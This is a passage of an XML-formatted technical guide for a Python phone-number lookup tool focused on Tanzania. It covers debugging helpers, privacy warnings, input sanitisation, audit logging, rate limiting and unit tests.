      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return results</text:p>
      <text:p text:style-name="Preformatted_20_Text">7. Common Errors and Debugging</text:p>
      <text:p text:style-name="Preformatted_20_Text">7.1 Error: "Invalid phone number format"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: The phone number doesn't match international format requirements.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def debug_invalid_number(number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Diagnose why a number is invalid."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>import phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Step 1: Check for obvious formatting issues</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Raw input: '{number}'")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Contains only digits and +: {all(c.isdigit() or c == '+' for c in number)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Starts with +: {number.startswith('+')}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Step 2: Try parsing with different countries</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for country in ['TZ', 'US', 'GB']:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>parsed = phonenumbers.parse(number, country)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"Parsed with {country}: {phonenumbers.is_valid_number(parsed)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"Parse with {country} failed: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Step 3: Check length</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>digits = ''.join(c for c in number if c.isdigit())</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Digits only: {digits}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Length: {len(digits)} digits (should be 7-15 for valid numbers)")</text:p>
      <text:p text:style-name="Preformatted_20_Text">7.2 Error: "Service Error" for geocoding</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: Nominatim API rate limiting or network issues.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Implement exponential backoff and fallback:</text:p>
      <text:p text:style-name="Preformatted_20_Text">import time</text:p>
      <text:p text:style-name="Preformatted_20_Text">import random</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def geocode_with_retry(location, max_retries=5):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Geocode with exponential backoff."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>from geopy.geocoders import Nominatim</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>from geopy.exc import GeocoderTimedOut, GeocoderServiceError</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>geolocator = Nominatim(user_agent="j_phone_notracker")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for attempt in range(max_retries):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Add jitter to avoid thundering herd</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>time.sleep(random.uniform(0.1, 0.5) * (2 ** attempt))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result = geolocator.geocode(location, timeout=5)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/>if result:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>return (result.latitude, result.longitude)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except GeocoderTimedOut:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.warning(f"Geocoder timeout (attempt {attempt+1})")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except GeocoderServiceError as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Geocoder service error: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>break <text:s/># Don't retry on service errors</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Unexpected error: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Fallback to local database</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return CITY_CENTERS.get(location)</text:p>
      <text:p text:style-name="Preformatted_20_Text">7.3 Error: Missing Carrier Information</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: Number portability or incomplete database.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Explanation: The phonenumbers library only returns the original carrier assigned to that prefix, not the current carrier after number portability .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Add warning to user:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def get_carrier_with_disclaimer(parsed_number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Get carrier with disclaimer about number portability."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>carrier_name = carrier.name_for_number(parsed_number, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if carrier_name:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'name': carrier_name,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'note': "This is the original carrier for this prefix. "</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>"Due to number portability, the current carrier may differ."</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'name': None,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'note': "Carrier information not available for this number."</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">7.4 Debugging Checklist</text:p>
      <text:p text:style-name="Preformatted_20_Text">When the application fails, use this systematic approach:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def debug_tracking_failure(phone):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Comprehensive debugging for tracking failures."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"=== Debugging tracking for {phone} ===\n")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 1. Basic validation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>from src.utils.validators import validate_phone_number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>valid = validate_phone_number(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"✓ Basic validation: {'PASS' if valid else 'FAIL'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 2. Parse with phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>import phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>parsed = phonenumbers.parse(phone, None)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"✓ Parse successful: country_code={parsed.country_code}, national={parsed.national_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"✗ Parse failed: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 3. Check validity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>valid = phonenumbers.is_valid_number(parsed)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"✓ Number validity: {'VALID' if valid else 'INVALID'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>possible = phonenumbers.is_possible_number(parsed)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f" <text:s/>Possible number: {possible}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 4. Get location</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>location = phonenumbers.geocoder.description_for_number(parsed, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"✓ Location: {location or 'Not available'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 5. Get carrier</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>carrier_name = phonenumbers.carrier.name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"✓ Carrier: {carrier_name or 'Not available'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 6. Get timezone</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tz = phonenumbers.timezone.time_zones_for_number(parsed)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"✓ Timezone: {tz or 'Not available'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># 7. Test geocoding</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if location:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>from src.core.geocoder import get_coordinates_from_location</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>coords = get_coordinates_from_location(location)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if coords:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"✓ Coordinates: {coords[0]:.4f}, {coords[1]:.4f}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"✗ Geocoding failed for '{location}'")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print("\n=== Debug complete ===")</text:p>
      <text:p text:style-name="Preformatted_20_Text">8. Security Considerations</text:p>
      <text:p text:style-name="Preformatted_20_Text">8.1 Privacy Risks and Ethical Use</text:p>
      <text:p text:style-name="Preformatted_20_Text">Critical Warning: J Phone NoTracker can be misused for stalking, harassment, or privacy violations. The creators explicitly state: "This tool is for educational and legitimate purposes only. Always respect privacy laws and regulations when using phone number tracking capabilities" .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Legal Framework in Tanzania:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Personal Data Protection Act, 2022: Regulates collection and processing of personal data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Electronic and Postal Communications Act: Governs telecommunications data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Cybercrimes Act, 2015: Criminalizes unauthorized access to computer systems and data</text:p>
      <text:p text:style-name="Preformatted_20_Text">8.2 Security Hardening for Production</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Security configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">class SecurityConfig:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Rate limiting to prevent abuse</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>RATE_LIMIT = "100 per hour per IP"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># API key protection</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>API_KEYS = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'nominatim': os.getenv('NOMINATIM_API_KEY'),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'google_maps': os.getenv('GOOGLE_MAPS_API_KEY'),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Logging sensitivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>LOG_SENSITIVE_DATA = False <text:s/># Don't log phone numbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Data retention</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>RETENTION_DAYS = 30 <text:s/># Automatically delete history after 30 days</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Access control</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>REQUIRE_AUTH = True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>JWT_SECRET = os.getenv('JWT_SECRET')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Encryption at rest</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>ENCRYPT_HISTORY = True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')</text:p>
      <text:p text:style-name="Preformatted_20_Text">8.3 Input Sanitization and Injection Prevention</text:p>
      <text:p text:style-name="Preformatted_20_Text">import re</text:p>
      <text:p text:style-name="Preformatted_20_Text">import html</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def sanitize_input(user_input):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Sanitize user input to prevent injection attacks.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Remove any HTML/script tags</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>clean = html.escape(user_input)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Allow only international phone number characters</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>clean = re.sub(r'[^\d+]', '', clean)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Ensure proper format</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not clean.startswith('+'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>clean = '+' + clean</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Limit length (max international numbers are 15 digits + '+')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if len(clean) &gt; 16:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>clean = clean[:16]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return clean</text:p>
      <text:p text:style-name="Preformatted_20_Text">8.4 Audit Logging for Compliance</text:p>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">import json</text:p>
      <text:p text:style-name="Preformatted_20_Text">from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class AuditLogger:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Audit logging for compliance and investigation."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, log_path="audit.log"):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger = logging.getLogger('audit')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>handler = logging.FileHandler(log_path)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>handler.setFormatter(logging.Formatter(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'%(asctime)s - %(message)s'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger.addHandler(handler)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger.setLevel(logging.INFO)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def log_lookup(self, user_id, phone_number, result, ip_address):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Log a phone number lookup for audit purposes."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Mask phone number for privacy in logs</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>masked = phone_number[:5] + '*' * (len(phone_number) - 8) + phone_number[-3:]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>audit_entry = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'timestamp': datetime.now().isoformat(),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'user_id': user_id,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'phone_masked': masked,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'ip_address': ip_address,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'result_summary': {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'valid': result.valid,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'country': result.country_name,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="16"/>'carrier': result.carrier_name</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger.info(json.dumps(audit_entry))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def log_error(self, user_id, phone_number, error, ip_address):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Log errors for security monitoring."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>audit_entry = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'timestamp': datetime.now().isoformat(),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'user_id': user_id,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'phone': phone_number,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'error': str(error),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'ip_address': ip_address,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'type': 'ERROR'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.logger.warning(json.dumps(audit_entry))</text:p>
      <text:p text:style-name="Preformatted_20_Text">8.5 Rate Limiting Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">from collections import defaultdict</text:p>
      <text:p text:style-name="Preformatted_20_Text">import time</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class RateLimiter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Simple rate limiter to prevent abuse."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, max_requests=100, window_seconds=3600):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.max_requests = max_requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.window_seconds = window_seconds</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.requests = defaultdict(list)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def is_allowed(self, client_id):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Check if client is within rate limits."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>now = time.time()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>window_start = now - self.window_seconds</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Clean old requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.requests[client_id] = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>req_time for req_time in self.requests[client_id]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if req_time &gt; window_start</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Check limit</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if len(self.requests[client_id]) &gt;= self.max_requests:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return False</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Add new request</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.requests[client_id].append(now)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def get_remaining(self, client_id):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Get remaining requests for client."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>now = time.time()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>window_start = now - self.window_seconds</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>recent = sum(1 for t in self.requests[client_id] if t &gt; window_start)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return max(0, self.max_requests - recent)</text:p>
      <text:p text:style-name="Preformatted_20_Text">9. Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text">9.1 Unit Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: tests/test_tracker.py</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>import unittest</text:p>
      <text:p text:style-name="Preformatted_20_Text">from unittest.mock import patch, MagicMock</text:p>
      <text:p text:style-name="Preformatted_20_Text">import sys</text:p>
      <text:p text:style-name="Preformatted_20_Text">import os</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import PhoneNumberTracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class TestPhoneNumberTracker(unittest.TestCase):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Unit tests for PhoneNumberTracker."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def setUp(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Set up test fixtures."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.tracker = PhoneNumberTracker(use_online_geocoding=False)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_valid_tanzanian_mobile(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Test tracking a valid Tanzanian mobile number."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertTrue(result.valid)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(result.country_code, 255)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertEqual(result.country_name, "Tanzania")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIn("tiGO", result.carrier_name) <text:s/># Prefix 71 is tiGO</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.assertIn("Africa/Dar_es_Salaam", result.timezones)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def test_valid_tanzanian_fixed_line(self):</text:p>
